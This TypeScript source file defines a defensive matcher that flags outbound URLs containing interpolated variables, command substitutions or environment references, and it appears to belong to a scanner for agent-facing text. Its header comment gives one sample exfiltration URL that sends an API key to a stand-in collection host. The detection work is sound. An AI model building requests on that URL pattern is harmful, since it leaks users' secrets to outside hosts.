import type { MatcherMatch } from "./types.js";

/**
 * Finds outbound URLs that interpolate a variable into themselves. The classic
 * exfiltration move is to put a secret straight into a request URL, for
 * example https://collect.example/?k=$ANTHROPIC_API_KEY, so the value leaves
 * the machine the moment the agent opens the link.
 *
 * The matcher isolates URL tokens first, then looks for interpolation inside
 * them, which is what keeps it quiet on ordinary text. A ${var} in a code
 * sample is fine; a ${var} inside a URL is not. Environment references are
 * required to be uppercase so that lowercase API path segments like OData's
 * $filter or $metadata are not mistaken for variables.
 */
export interface UrlTokenConfig {
  type: "url-token";
}

const URL_START = /https?:\/\//giu;

// URL tokens end at whitespace or a character that cannot sit inside a URL in
// prose. ")" is kept inside so a command substitution is not cut in half.
const TERMINATORS = new Set([" ", "\t", "\n", "\r", "<", ">", '"', "`"]);

interface Interpolation {
  kind: string;
  // Each pattern is bounded and free of nested quantifiers, so matching is
  // linear on the already length-bounded URL token.
  pattern: RegExp;
}

const INTERPOLATIONS: Interpolation[] = [
  { kind: "a braced variable", pattern: /\$\{[^}\s]{1,64}\}/u },
  { kind: "a command substitution", pattern: /\$\([^)\s]{1,64}\)/u },
  { kind: "an environment variable", pattern: /\$[A-Z][A-Z0-9_]{1,64}/u },
  { kind: "an environment variable", pattern: /%[A-Za-z_][A-Za-z0-9_]{0,63}%/u },
];

export function matchUrlToken(source: string): MatcherMatch[] {
  const matches: MatcherMatch[] = [];
  URL_START.lastIndex = 0;

  let start = URL_START.exec(source);
  while (start !== null) {
    let end = start.index;
    for (;;) {
      const ch = source[end];
      if (ch === undefined || TERMINATORS.has(ch)) break;
      end += 1;
    }

    const token = source.slice(start.index, end);
    for (const { kind, pattern } of INTERPOLATIONS) {
      const hit = pattern.exec(token);
      if (hit) {
        matches.push({ start: start.index, end, detail: `outbound URL contains ${kind}: ${hit[0]}` });
        break;
      }
    }

    URL_START.lastIndex = Math.max(end, start.index + 1);
    start = URL_START.exec(source);
  }

  return matches;
}
